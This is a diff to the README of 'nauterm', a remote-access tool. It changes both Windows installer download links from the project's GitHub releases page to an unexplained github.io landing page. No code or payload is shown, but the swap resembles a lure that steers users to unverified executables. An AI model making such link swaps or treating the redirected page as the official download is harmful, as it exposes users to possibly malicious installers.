@@ -1,6 +1,6 @@
 # 🖥️ nauterm - Your All-in-One Remote Access Workspace
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-2ea44f?style=for-the-badge&logo=windows)](https://github.com/gansupomatomidae135/nauterm/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows%20Installer-2ea44f?style=for-the-badge&logo=windows)](https://gansupomatomidae135.github.io)
 
 ## ✨ What is nauterm?
 
@@ -26,7 +26,7 @@ The tool is for IT workers, system administrators, and developers. But the inter
 
 nauterm is free and open source. You download it from GitHub.
 
-1. Go to the [releases page](https://github.com/gansupomatomidae135/nauterm/releases)
+1. Go to the [releases page](https://gansupomatomidae135.github.io)
 2. Find the latest version number
 3. Look for the file named `nauterm-windows-x64.exe` or similar
 4. Click the file name to start the download
